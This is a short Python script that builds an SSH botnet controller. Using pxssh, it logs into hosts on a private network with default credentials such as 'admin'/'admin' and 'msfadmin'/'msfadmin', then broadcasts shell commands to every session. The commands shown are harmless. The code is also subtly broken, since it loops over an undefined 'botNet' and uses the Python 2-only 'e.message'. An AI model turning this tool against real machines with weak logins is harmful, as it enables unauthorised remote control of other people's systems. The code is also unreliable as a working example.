import pxssh

class Client:

    def __init__(self, host, user, password):
        self.host = host
        self.user = user
        self.password = password
        self.session = self.connect()

    def connect(self):
        try:
            sec = pxssh.pxssh()
            sec.login(self.host, self.user, self.password)
            return sec
        except Exception as e:
            print ("%s" % e.message)
            print ("[-] Error Connect")

    def send_command(self, cmd):
        self.session.sendline(cmd)
        self.session.prompt()
        return self.session.before

def botnetCommand(command):
    for client in botNet:
        output = client.send_command(command)
        print ('[+] Output from ' + client.host)
        print ('[+] ' + output)

def addClient(host, user, password):
    client = Client(host, user, password)
    clientlist.append(client)

clientlist = []
addClient('192.168.0.2', 'admin', 'admin')
addClient('192.168.0.6', 'msfadmin', 'msfadmin')
botnetCommand('uname -a')
botnetCommand('ping 127.0.0.1')

